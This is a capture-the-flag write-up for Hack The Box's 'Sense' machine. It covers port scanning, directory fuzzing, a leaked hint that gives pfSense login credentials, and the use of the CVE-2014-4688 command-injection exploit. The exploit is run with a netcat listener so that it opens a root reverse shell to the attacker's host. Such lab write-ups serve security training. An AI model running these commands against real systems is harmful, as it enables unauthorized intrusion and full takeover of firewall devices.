# Sense

**OS:** FreeBSD

**Level:** Easy

**Links:** [1](https://www.hackthebox.com/machines/sense)  [2](https://app.hackthebox.com/machines/Sense)

**Machine ip:** 10.10.10.60

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/e379c135-5e25-4ae9-abb1-13ee23189ff6)


# Sections
+ [Enumeration](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/09_Sense.md#enumeration)
+ [Privilege Escalation](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/09_Sense.md#privilege-escalation)
+ [Links](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/09_Sense.md#links)


## Enumeration
+ `sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.60 -e tun0 > ports`
+ `ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')`
+ `sudo nmap -Pn -sV -sC -p$ports 10.10.10.60`

+ 2 ports are open which are 80 and 443:

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/6749553f-08d1-460f-aad6-1fbb09ae51ea)

+ Port 80 redirects to port 443 so we really only have one port to enumerate.
+ Navigate to `https://10.10.10.60/`
+ pfsense login panel.
+ Try [pfsense](https://docs.netgate.com/pfsense/en/latest/usermanager/defaults.html) default username and password.
+ Try brute force trial and errors.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/d249333a-0934-4e18-a2ff-d8eeb457d36c)

+ No works, and continue with directory fuzzing:
```
gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.10.60/ -k -n -x html,php,txt -t 50
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/9a9704e1-f08a-4337-8340-8807b3a9efb4)

+ **system-users.txt** and changelog.txt are interesting, and check them out.
+ Navigate to `https://10.10.10.60/system-users.txt` and `https://10.10.10.60/changelog.txt`
```
####Support ticket###

Please create the following user


username: Rohit
password: company defaults
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/6601d0fd-d8aa-440c-b85e-eb1598afba6e)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/cd931495-72f9-4c8f-b47b-d3f125ba4868)

+ Login pfsense using credentials `rohit`:`pfsense`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/97eb08bc-2825-44a1-a5ba-897c186d2689)

+ See that version is **2.1.3**


## Privilege Escalation

+ View any vulnerabilities that pfsense is associated with : `searchsploit pfsense`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/d1945b44-4ad0-402f-add2-f2206ebf4ad8)

+ For more perspective: https://sploitus.com

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/0e8107b4-dc87-45ac-b91e-5f8fdbf561ee)

+ pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injection: [CVE-2014-4688](https://www.exploit-db.com/exploits/43560)
+ Check the vulnerability what's doing.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ff6726fb-505d-4fd4-90a8-460f9d7a5549)

+ Transfer the exploit: `searchsploit -m 43560`
+ Start listener: `nc -lnvp 5555`
+ `python3 43560.py --rhost 10.10.10.60 --lhost 10.10.14.7 --lport 5555 --username rohit --password pfsense`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/d6f35b34-e308-432b-8f48-3756e6010eba)

+ Get root shell.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/35e0d755-020d-4e1f-92e6-e8405893a3c0)


# Links

# References & Alternatives
+ https://vvmlist.github.io/#sense
+ https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/sense-writeup-w-o-metasploit
+ https://0xdf.gitlab.io/2021/03/11/htb-sense.html
+ https://benheater.com/hackthebox-sense/
+ https://xavilok.es/posts/Sense.php
+ https://ethicalhacs.com/sense-hackthebox-walkthrough/
+ https://v3ded.github.io/ctf/htb-sense
+ https://medium.com/@andr3w_hilton/htb-sense-walkthrough-6236970644c1
